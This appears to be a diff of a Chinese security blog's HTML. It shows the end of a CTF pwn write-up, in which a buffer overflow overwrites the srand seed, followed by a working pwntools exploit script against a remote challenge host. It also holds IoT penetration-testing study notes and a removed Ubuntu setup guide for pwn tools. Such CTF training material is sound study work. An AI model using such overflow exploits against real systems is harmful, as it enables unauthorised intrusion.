-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall sub_B28(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  char s; &#x2F;&#x2F; [rsp+10h] [rbp-70h]</span><br><span class="line">  FILE *stream; &#x2F;&#x2F; [rsp+78h] [rbp-8h]</span><br><span class="line">  printf(&quot;Congrats %s\n&quot;, a1);</span><br><span class="line">  stream &#x3D; fopen(&quot;flag&quot;, &quot;r&quot;);</span><br><span class="line">  fgets(&amp;s, 100, stream);</span><br><span class="line">  puts(&amp;s);</span><br><span class="line">  return fflush(stdout);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>在输入name时，令输入数据覆盖srand函数内部随机种子，就可以控制随机数的生成。</p>
-<p><img src="https://i.loli.net/2020/07/23/fxEhB6bCWcH9enR.png" alt="相差40.PNG"></p>
-<p>随机树种子地址与输入名字的buf地址之间相差0x40,所以将seed覆盖掉</p>
-<h2 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ctypes import *</span><br><span class="line">p&#x3D;remote(&#39;220.249.52.133&#39;,34691)</span><br><span class="line">libc&#x3D;cdll.LoadLibrary(&quot;libc.so.6&quot;)</span><br><span class="line">p.recv()</span><br><span class="line">payload&#x3D;0x40*&#39;a&#39;+p64(0)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">a&#x3D;[]</span><br><span class="line">for i in range(50):</span><br><span class="line">    a.append(libc.rand()%6+1)</span><br><span class="line">print(a)</span><br><span class="line">for i in a:</span><br><span class="line">    p.recv()</span><br><span class="line">    print(p.recv())</span><br><span class="line">    p.sendline(str(i))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
       
       
     </div>
@@ -751,6 +826,96 @@
       
     <div class="article-tag tagcloud">
         <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/chrome/" rel="tag">chrome</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-《物联网渗透测试》学习笔记1" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/10/16/%E3%80%8A%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/" class="article-date">
+      <time datetime="2020-10-16T04:29:57.388Z" itemprop="datePublished">2020-10-16</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/10/16/%E3%80%8A%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/">《物联网渗透测试》学习笔记1</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="0x01-IOT渗透测试"><a href="#0x01-IOT渗透测试" class="headerlink" title="0x01 IOT渗透测试"></a>0x01 IOT渗透测试</h1><p>定义IoT生态系统与渗透测试生命周期</p>
+<ul>
+<li>渗透测试方法：<ul>
+<li>黑盒测试</li>
+<li>白盒测试</li>
+<li>灰盒测试<h2 id="固件入门"><a href="#固件入门" class="headerlink" title="固件入门"></a>固件入门</h2>固件是一种写入硬件设备的软件，作用是对应用和各项系统功能实施控制，运行固件的设备称为嵌入式系统。</li>
+</ul>
+</li>
+</ul>
+<p>固件通常由bootloader、内核、文件系统以及其他资源组成，</p>
+<p>固件组成：闪存、bootloader、内核、根文件系统。</p>
+<ul>
+<li><p>bootloader:主要作用包括RAM初始化（目的是存储易失性数据）、串口初始化、机器类型检测、内核参数链表设置、initramfs(基于RAM的初始文件系统)加载以及内核镜像调用等。ARM、MIPS架构中部分常见的bootloader包括：Redboot、u-boot以及barebox等。当bootloader启动内核之后，文件系统就完成了加载。</p>
+</li>
+<li><p>固件可以采用的文件系统类型：SquashFS、cramFS、JFFS2、YAFFS2以及ext2等。</p>
+<h2 id="IoT中的Web应用"><a href="#IoT中的Web应用" class="headerlink" title="IoT中的Web应用"></a>IoT中的Web应用</h2><p>通常嵌入书web应用被设计为在自包含的环境中运行</p>
+</li>
+<li><p>目前iot领域主要有两种不同的web应用模型</p>
+<ul>
+<li>混合云模型：包含厂商或供应商提供的基于软件即服务的web应用，作用是同运行在嵌入式设备固件中的web应用程序建立连接，将数据从厂商的云服务器中同步到本地网络的嵌入式设备中。</li>
+<li>独立嵌入式服务器模型</li>
+</ul>
+</li>
+</ul>
+<p>web通信：浏览器、、嵌入式服务器和web应用服务器之间的通信通常要么借助简单对象访问协议（SOAP）/XML等web服务，要么借助基于http/htps复合REST规范的API来实现。</p>
+<h2 id="硬件设备基础"><a href="#硬件设备基础" class="headerlink" title="硬件设备基础"></a>硬件设备基础</h2><p>硬件输入：</p>
+<ul>
+<li>EEPROM，是非易失性存储器。以单个字节为单位进行读写，可通过电荷或紫外线照射擦除数据。读写次数有限。</li>
+<li>NAND闪存以区块为单位读写。存储设备的boootloader。</li>
+<li>UART接口是访问设备最为常见的方式。连接改接口后即可获得root权限。PCB上UART接口的引脚定义中包括Tx、Rx、Vcc和GND 4个引脚。连接UART接口前需要使用万用表识别出引脚。</li>
+<li>JTAG接口是遵循IEEE 1149.1标准的另一种国际标准测试协议。用于芯片级和系统级的测试。，包含5个引脚：TDI、TDO、TMS、TCK、TRST.可以接到芯片的tap（测试访问口）<h2 id="IoT无线通信简介"><a href="#IoT无线通信简介" class="headerlink" title="IoT无线通信简介"></a>IoT无线通信简介</h2>最常用协议：Wi-Fi(802.11)、ZigBee(802.15.4)、Z-Ware、蓝牙(802.15.1)、低功耗蓝牙。<h1 id="IoT威胁建模"><a href="#IoT威胁建模" class="headerlink" title="IoT威胁建模"></a>IoT威胁建模</h1></li>
+</ul>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/IOT-%E3%80%8A%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8B/" rel="tag">IOT 《物联网渗透测试》</a></li></ul>
     </div>
 
       
@@ -1054,96 +1219,6 @@
 
 
   
-    <article id="post-《物联网渗透测试》学习笔记1" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2020/10/16/%E3%80%8A%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/" class="article-date">
-      <time datetime="2020-10-16T04:29:57.388Z" itemprop="datePublished">2020-10-16</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/10/16/%E3%80%8A%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/">《物联网渗透测试》学习笔记1</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h1 id="0x01-IOT渗透测试"><a href="#0x01-IOT渗透测试" class="headerlink" title="0x01 IOT渗透测试"></a>0x01 IOT渗透测试</h1><p>定义IoT生态系统与渗透测试生命周期</p>
-<ul>
-<li>渗透测试方法：<ul>
-<li>黑盒测试</li>
-<li>白盒测试</li>
-<li>灰盒测试<h2 id="固件入门"><a href="#固件入门" class="headerlink" title="固件入门"></a>固件入门</h2>固件是一种写入硬件设备的软件，作用是对应用和各项系统功能实施控制，运行固件的设备称为嵌入式系统。</li>
-</ul>
-</li>
-</ul>
-<p>固件通常由bootloader、内核、文件系统以及其他资源组成，</p>
-<p>固件组成：闪存、bootloader、内核、根文件系统。</p>
-<ul>
-<li><p>bootloader:主要作用包括RAM初始化（目的是存储易失性数据）、串口初始化、机器类型检测、内核参数链表设置、initramfs(基于RAM的初始文件系统)加载以及内核镜像调用等。ARM、MIPS架构中部分常见的bootloader包括：Redboot、u-boot以及barebox等。当bootloader启动内核之后，文件系统就完成了加载。</p>
-</li>
-<li><p>固件可以采用的文件系统类型：SquashFS、cramFS、JFFS2、YAFFS2以及ext2等。</p>
-<h2 id="IoT中的Web应用"><a href="#IoT中的Web应用" class="headerlink" title="IoT中的Web应用"></a>IoT中的Web应用</h2><p>通常嵌入书web应用被设计为在自包含的环境中运行</p>
-</li>
-<li><p>目前iot领域主要有两种不同的web应用模型</p>
-<ul>
-<li>混合云模型：包含厂商或供应商提供的基于软件即服务的web应用，作用是同运行在嵌入式设备固件中的web应用程序建立连接，将数据从厂商的云服务器中同步到本地网络的嵌入式设备中。</li>
-<li>独立嵌入式服务器模型</li>
-</ul>
-</li>
-</ul>
-<p>web通信：浏览器、、嵌入式服务器和web应用服务器之间的通信通常要么借助简单对象访问协议（SOAP）/XML等web服务，要么借助基于http/htps复合REST规范的API来实现。</p>
-<h2 id="硬件设备基础"><a href="#硬件设备基础" class="headerlink" title="硬件设备基础"></a>硬件设备基础</h2><p>硬件输入：</p>
-<ul>
-<li>EEPROM，是非易失性存储器。以单个字节为单位进行读写，可通过电荷或紫外线照射擦除数据。读写次数有限。</li>
-<li>NAND闪存以区块为单位读写。存储设备的boootloader。</li>
-<li>UART接口是访问设备最为常见的方式。连接改接口后即可获得root权限。PCB上UART接口的引脚定义中包括Tx、Rx、Vcc和GND 4个引脚。连接UART接口前需要使用万用表识别出引脚。</li>
-<li>JTAG接口是遵循IEEE 1149.1标准的另一种国际标准测试协议。用于芯片级和系统级的测试。，包含5个引脚：TDI、TDO、TMS、TCK、TRST.可以接到芯片的tap（测试访问口）<h2 id="IoT无线通信简介"><a href="#IoT无线通信简介" class="headerlink" title="IoT无线通信简介"></a>IoT无线通信简介</h2>最常用协议：Wi-Fi(802.11)、ZigBee(802.15.4)、Z-Ware、蓝牙(802.15.1)、低功耗蓝牙。<h1 id="IoT威胁建模"><a href="#IoT威胁建模" class="headerlink" title="IoT威胁建模"></a>IoT威胁建模</h1></li>
-</ul>
-
-      
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/IOT-%E3%80%8A%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8B/" rel="tag">IOT 《物联网渗透测试》</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
     <article id="post-V8漏洞初学习" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -1388,120 +1463,6 @@
       
     <div class="article-tag tagcloud">
         <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E3%80%8A0-Day%E5%AE%89%E5%85%A8%E3%80%8B/" rel="tag">《0 Day安全》</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-ubuntu重装之各种环境搭建" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2020/10/16/ubuntu%E9%87%8D%E8%A3%85%E4%B9%8B%E5%90%84%E7%A7%8D%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="article-date">
-      <time datetime="2020-10-16T04:29:57.350Z" itemprop="datePublished">2020-10-16</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/10/16/ubuntu%E9%87%8D%E8%A3%85%E4%B9%8B%E5%90%84%E7%A7%8D%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">ubuntu16.04重装之各种环境搭建</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>环境：ubuntu16.04</p>
-<h1 id="0x00-vmtools解决坑点"><a href="#0x00-vmtools解决坑点" class="headerlink" title="0x00 vmtools解决坑点"></a>0x00 vmtools解决坑点</h1><p>有点无语，笔者踩坑无数，没想到有一天在重装vmtool的时候还能……</p>
-<p>正常安装vmtool后仍旧无法与主机进行复制粘贴，关掉虚拟机查看虚拟机设置。</p>
-<p><img src="https://i.loli.net/2020/10/10/zOQ1jZT5SYip47N.png" alt="捕获.PNG"></p>
-<p><img src="https://i.loli.net/2020/10/10/9pYJxdtsKFEUy4M.png" alt="捕获.PNG"></p>
-<p>建立的共享文件夹要设置属性为共享式。</p>
-<p>搞完之后……就可以了。</p>
-<p>此处贴一个跟我一样的暴躁博主教程：<br><a href="https://blog.csdn.net/zerolity/article/details/81206476" target="_blank" rel="noopener">https://blog.csdn.net/zerolity/article/details/81206476</a></p>
-<h1 id="0x01-pwntools安装"><a href="#0x01-pwntools安装" class="headerlink" title="0x01 pwntools安装"></a>0x01 pwntools安装</h1><p>1.安装python2.7和pip</p>
-<p><code>sudo apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential</code></p>
-<p>2.升级pip：<code>sudo pip install --upgrade pip</code></p>
-<p>更改pip的配置文件/usr/bin/pip</p>
-<p>更改为：</p>
-<p><img src="https://i.loli.net/2020/10/10/zGq57OjUeWcxXnM.png" alt="捕获.PNG"></p>
-<p>3.安装pwntools：<code>sudo pip install pwntools</code></p>
-<p>报错超时，换个阿里源就好了。</p>
-<p>3.1 更换阿里源</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">cd &#x2F;etc&#x2F;apt #切换到apt源文件</span><br><span class="line">mv source.list sources.list_bak #备份源文件</span><br><span class="line">vim sources.list #新建一个，直接把下面的内容copy进去</span><br></pre></td></tr></table></figure>
-
-<p>copy的内容：</p>
-<figure class="highlight plain"><figcaption><span>deb cdrom:[Ubuntu 16.04 LTS _Xenial Xerus_ - Release amd64 (20160420.1)]/ xenial main restricted</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">deb-src http:&#x2F;&#x2F;archive.ubuntu.com&#x2F;ubuntu xenial main restricted #Added by software-properties</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; xenial main restricted</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; xenial main restricted multiverse universe #Added by software-properties</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; xenial-updates main restricted</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; xenial-updates main restricted multiverse universe #Added by software-properties</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; xenial universe</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; xenial-updates universe</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; xenial multiverse</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; xenial-updates multiverse</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; xenial-backports main restricted universe multiverse</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; xenial-backports main restricted universe multiverse #Added by software-properties</span><br><span class="line">deb http:&#x2F;&#x2F;archive.canonical.com&#x2F;ubuntu xenial partner</span><br><span class="line">deb-src http:&#x2F;&#x2F;archive.canonical.com&#x2F;ubuntu xenial partner</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; xenial-security main restricted</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; xenial-security main restricted multiverse universe #Added by software-properties</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; xenial-security universe</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; xenial-security multiverse</span><br></pre></td></tr></table></figure>
-
-<p>3.2 保存配置后，更新配置：<code>sudo apt-get update</code></p>
-<p>之后再重新步骤三的安装命令即可。</p>
-<p>4.测试</p>
-<p><img src="https://i.loli.net/2020/10/10/7wzfu32HFRiCXap.png" alt="捕获.PNG"></p>
-<p>无报错，返回了’1\xc0’，成功！</p>
-<p>所以为啥第一次自己去安装pwntools的时候费了很多力气呢，感觉那时候踩坑无数到崩溃……</p>
-<h1 id="0x02-GDB及三个插件的安装"><a href="#0x02-GDB及三个插件的安装" class="headerlink" title="0x02 GDB及三个插件的安装"></a>0x02 GDB及三个插件的安装</h1><p>在终端输入gdb，发现ubuntu16自带gdb，那我就直接安装插件得了。</p>
-<ul>
-<li>peda:做逆向破解</li>
-<li>gef：用于debug最好</li>
-<li>gdbinit：简单版</li>
-</ul>
-<p>用git下载插件：<br><code>git clone https://github.com/gatieme/GdbPlugins.git ~/GdbPlugins</code></p>
-<p>没有git的下载：<code>apt-get install git</code></p>
-<p>在目录GdbPlugin下可以看见三个插件，想用哪个插件就可以在该目录下输入对应命令：</p>
-<figure class="highlight plain"><figcaption><span>"source ~/GdbPlugins/peda/peda.py" > ~/.gdbinit </span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;source ~&#x2F;GdbPlugins&#x2F;gef&#x2F;gef.py&quot; &gt; ~&#x2F;.gdbinit </span><br><span class="line">echo &quot;source ~&#x2F;GdbPlugins&#x2F;gdbinit&#x2F;gdbinit&quot; &gt; ~&#x2F;.gdbinit</span><br></pre></td></tr></table></figure>
-
-<h1 id="0x03-安装checksec"><a href="#0x03-安装checksec" class="headerlink" title="0x03 安装checksec"></a>0x03 安装checksec</h1><figure class="highlight plain"><figcaption><span>clone</span><a href="https://github.com/slimm609/checksec.sh.git" target="_blank" rel="noopener">link</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd checksec.sh</span><br></pre></td></tr></table></figure>
-
-<p>目录下的checksec本来想建立一个软链接过去/usr/local/bin里，但是一直打不开，于是直接用cp命令把checksec拷贝过去了。在/usr/local/bin能够打开checksec，才算成功。</p>
-<h1 id="0x04-安装docker-pikachu靶场"><a href="#0x04-安装docker-pikachu靶场" class="headerlink" title="0x04 安装docker+pikachu靶场"></a>0x04 安装docker+pikachu靶场</h1><h4 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h4><ul>
-<li>先卸载可能存在的旧版本： <code>$ sudo apt-get remove docker docker-engine docker-ce docker.io</code></li>
-<li>更新apt包索引: <code>$ sudo apt-get update</code></li>
-<li>安装以下包以使apt可以通过HTTPS使用存储库（repository）: <code>$ sudo apt-get install -y apt-transport-https ca-certificates curl software-properties-common</code></li>
-<li>添加Docker官方的GPG密钥： <code>$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</code></li>
-<li>使用下面的命令来设置stable存储库： <code>$ sudo add-apt-repository &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable&quot;</code></li>
-<li>再更新一下apt包索引: <code>$ sudo apt-get update</code></li>
-<li>安装最新版本的Docker CE：<code>$ sudo apt-get install -y docker-ce</code></li>
-<li>查看docker服务是否启动： <code>$ systemctl status docker</code></li>
-<li>若未启动，则启动docker服务: <code>$ sudo systemctl start docker</code></li>
-<li>经典的hello world： <code>$ sudo docker run hello-world</code></li>
-</ul>
-<p><img src="https://i.loli.net/2020/10/13/kofhug8n2VNj1bx.png" alt="捕获.PNG"></p>
-<p>如图输出则表示docker安装成功。</p>
-<h4 id="pikachu靶场"><a href="#pikachu靶场" class="headerlink" title="pikachu靶场"></a>pikachu靶场</h4>
-      
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" rel="tag">环境搭建</a></li></ul>
     </div>
 
       
